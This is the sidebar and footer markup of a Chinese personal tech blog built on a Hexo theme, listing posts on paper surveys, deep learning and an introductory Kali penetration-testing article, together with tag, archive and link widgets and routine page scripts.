            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-13T11:41:34.000Z">2020-03-13</time></div>
                    <a href="/2020/03/13/【论文调研】IJCAI-2019/" class="has-link-black-ter is-size-6">【论文调研】IJCAI-2019 论文投稿与录用调研报告</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/论文调研/">论文调研</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2019/08/01/【论文解读】深度学习综述/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="https://s2.ax1x.com/2020/02/29/36BNQ0.jpg" alt="【论文解读】深度学习综述">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-08-01T04:41:34.000Z">2019-08-01</time></div>
                    <a href="/2019/08/01/【论文解读】深度学习综述/" class="has-link-black-ter is-size-6">【论文解读】深度学习综述</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/论文解读/">论文解读</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2019/07/31/【Kali LInux】 渗透测试技术入门/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="https://s2.ax1x.com/2020/02/29/36aAgK.jpg" alt="【Kali 渗透测试】入门篇">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-31T04:41:34.000Z">2019-07-31</time></div>
                    <a href="/2019/07/31/【Kali LInux】 渗透测试技术入门/" class="has-link-black-ter is-size-6">【Kali 渗透测试】入门篇</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/信息安全/">信息安全</a> / <a class="has-link-grey -link" href="/categories/信息安全/渗透测试/">渗透测试</a>
                    </p>
                </div>
            </div>
        </article>
        
    </div>
</div>

    
        
<div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                分类
            </h3>
            <ul class="menu-list">
            <li>
        <a class="level is-marginless" href="/categories/信息安全/">
            <span class="level-start">
                <span class="level-item">信息安全</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a><ul><li>
        <a class="level is-marginless" href="/categories/信息安全/渗透测试/">
            <span class="level-start">
                <span class="level-item">渗透测试</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li></ul></li><li>
        <a class="level is-marginless" href="/categories/论文解读/">
            <span class="level-start">
                <span class="level-item">论文解读</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">2</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/论文调研/">
            <span class="level-start">
                <span class="level-item">论文调研</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li>
            </ul>
        </div>
    </div>
</div>
    
        

<div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            链接
        </h3>
        <ul class="menu-list">
        
            <li>
                <a class="level is-mobile" href="https://google.com" target="_blank">
                    <span class="level-left">
                        <span class="level-item">Google</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">google.com</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://baidu.com" target="_blank">
                    <span class="level-left">
                        <span class="level-item">Baidu</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">baidu.com</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://leetcode-cn.com" target="_blank">
                    <span class="level-left">
                        <span class="level-item">LeetCode</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">leetcode-cn.com</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://pintia.cn/problem-sets?tab=0" target="_blank">
                    <span class="level-left">
                        <span class="level-item">PAT</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">pintia.cn</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="http://codeforces.com/blog/entry/57282" target="_blank">
                    <span class="level-left">
                        <span class="level-item">CodeForces</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">codeforces.com</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://oi-wiki.org/basic/" target="_blank">
                    <span class="level-left">
                        <span class="level-item">NOIP</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">oi-wiki.org</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://me.csdn.net/qq_33592583" target="_blank">
                    <span class="level-left">
                        <span class="level-item">CSDN</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">me.csdn.net</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://www.luogu.com.cn/problem/list" target="_blank">
                    <span class="level-left">
                        <span class="level-item">LuoGo</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">www.luogu.com.cn</span>
                    </span>
                </a>
            </li>
        
        </ul>
        </div>
    </div>
</div>


    
    
        <div class="column-right-shadow is-hidden-widescreen is-sticky">
        
            
<div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            标签云
        </h3>
        <a href="/tags/AutoML/" style="font-size: 10px;">AutoML</a> <a href="/tags/IJCAI/" style="font-size: 10px;">IJCAI</a> <a href="/tags/Machine-Learning/" style="font-size: 10px;">Machine Learning</a> <a href="/tags/RNN/" style="font-size: 10px;">RNN</a> <a href="/tags/会议投稿/" style="font-size: 10px;">会议投稿</a> <a href="/tags/信息安全/" style="font-size: 10px;">信息安全</a> <a href="/tags/关系抽取/" style="font-size: 10px;">关系抽取</a> <a href="/tags/图卷积网络/" style="font-size: 10px;">图卷积网络</a> <a href="/tags/强化学习/" style="font-size: 10px;">强化学习</a> <a href="/tags/机器学习/" style="font-size: 10px;">机器学习</a> <a href="/tags/深度学习/" style="font-size: 10px;">深度学习</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/知识图谱/" style="font-size: 10px;">知识图谱</a> <a href="/tags/自然语言处理/" style="font-size: 10px;">自然语言处理</a> <a href="/tags/计算机视觉/" style="font-size: 10px;">计算机视觉</a> <a href="/tags/链接预测/" style="font-size: 10px;">链接预测</a>
    </div>
</div>

        
            <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            归档
        </h3>
        <ul class="menu-list">
        
        <li>
            <a class="level is-marginless" href="/archives/2020/03/">
                <span class="level-start">
                    <span class="level-item">三月 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/08/">
                <span class="level-start">
                    <span class="level-item">八月 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/07/">
                <span class="level-start">
                    <span class="level-item">七月 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        </ul>
        </div>
    </div>
</div>
        
            <div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                标签
            </h3>
            <div class="field is-grouped is-grouped-multiline">
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/AutoML/">
                        <span class="tag">AutoML</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/IJCAI/">
                        <span class="tag">IJCAI</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/Machine-Learning/">
                        <span class="tag">Machine Learning</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/RNN/">
                        <span class="tag">RNN</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/会议投稿/">
                        <span class="tag">会议投稿</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/信息安全/">
                        <span class="tag">信息安全</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/关系抽取/">
                        <span class="tag">关系抽取</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/图卷积网络/">
                        <span class="tag">图卷积网络</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/强化学习/">
                        <span class="tag">强化学习</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/机器学习/">
                        <span class="tag">机器学习</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/深度学习/">
                        <span class="tag">深度学习</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/渗透测试/">
                        <span class="tag">渗透测试</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/知识图谱/">
                        <span class="tag">知识图谱</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/自然语言处理/">
                        <span class="tag">自然语言处理</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/计算机视觉/">
                        <span class="tag">计算机视觉</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/链接预测/">
                        <span class="tag">链接预测</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
            </div>
        </div>
    </div>
</div>
        
        </div>
    
</div>

                

<!-- 粘贴的部分 -->

            </div>
        </div>
    </section>

    <footer class="footer">
    <div class="container">
        <div class="level">
            <div class="level-start has-text-centered-mobile">
                <a class="footer-logo is-block has-mb-6" href="/">
                
                    <img src="/images/logo.svg" alt="【Kali 渗透测试】入门篇" height="28">
                
                </a>
                <p class="is-size-7">
                &copy; 2020 止歌&nbsp;
                Powered by <a href="https://www.adaboost.cn/" target="_blank">rookie</a> & <a href="https://www.adaboost.cn/" target="_blank">wuhao</a>
<br>
All Rights Reserved 京ICP1098765号
   
                </p>
            </div>
            <div class="level-end">
            
                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
                        
                        <i class="fab fa-creative-commons"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                        
                        <i class="fab fa-creative-commons-by"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                </p>
                
                </div>
            
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">

<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
            <script>
                var now = new Date(); 
                function createtime() { 
                    var grt= new Date("08/01/2019 00:00:00");//此处修改你的建站时间或者网站上线时间 
                    now.setTime(now.getTime()+250); 
                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
                    document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
                } 
            setInterval("createtime()",250);
            </script>
<br>

  Total <span id="busuanzi_value_site_pv"></span> views.
  |  您是第 <span id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></span> 个小伙伴
  |  <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Hits



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


            </div>
        </div>
    </div>
</footer>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
<script>moment.locale("zh-CN");</script>


    
    
    
    <script src="/js/animation.js"></script>
    

    
    
    
    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
    <script src="/js/gallery.js" defer></script>
    

    
    

<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
            my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        });
    });
</script>


    
    
<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    MathJax.Hub.Config({
        'HTML-CSS': {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
});
</script>

    
    

<a id="back-to-top" title="回到顶端" href="javascript:;">
    <i class="fas fa-chevron-up"></i>
</a>
<script src="/js/back-to-top.js" defer></script>


    
    

    
    
    
    

    
    
    
    
    
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
    <script src="/js/clipboard.js" defer></script>
    

    
    
    

    


<script src="/js/main.js" defer></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: '文章',
                PAGES: '页面',
                CATEGORIES: '分类',
                TAGS: '标签',
                UNTITLED: '(无标题)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js" defer></script>
<link rel="stylesheet" href="/css/search.css">
<link rel="stylesheet" href="/css/insight.css">
    



<script type="text/javascript" color="0,0,255" opacity="0.7" zindex="-1 count=" 99" src="https://cdnjs.cloudflare.com/ajax/libs/canvas-nest.js/2.0.4/canvas-nest.js"></script>
<!--
<script type="text/javascript">
      var windowWidth = $(window).width();
      if (windowWidth > 480) {
        document.write('<script type="text/javascript" src="/js/snow.js"><\/script>');
      }
</script>-->
<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
<script type="text/javascript" src="/js/click_show_text.js"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>